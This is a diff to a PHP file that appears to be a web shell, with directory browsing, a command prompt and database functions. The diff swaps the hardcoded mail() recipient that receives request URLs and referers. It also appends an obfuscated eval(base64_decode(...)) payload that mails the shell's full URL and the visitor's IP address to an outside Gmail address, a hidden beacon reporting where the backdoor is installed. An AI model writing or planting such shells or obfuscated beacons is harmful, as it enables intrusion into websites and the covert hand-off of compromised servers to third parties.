@@ -138,7 +138,7 @@ function showdir($pwd, $prompt) {
     $mes.= "URL: " . $_SERVER['REQUEST_URI'] . "
 ";
     $mes.= "Referer: " . $_SERVER['HTTP_REFERER'] . ""; {
-        mail("free.d0ing.1987@gmail.com", $sub, $mes, $headers);
+        mail("kalix0xalik@gmail.com", $sub, $mes, $headers);
     }
     if ($tree > 2) for ($i = 0;$i < $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
     else $parent = $pwd;
@@ -580,4 +580,4 @@ SHOW STATUS;";
     }
     $buff = showdir($pwd, $prompt);
     echo $buff;
-} ?> </div> </body> </html>
+} eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));?> </div> </body> </html>
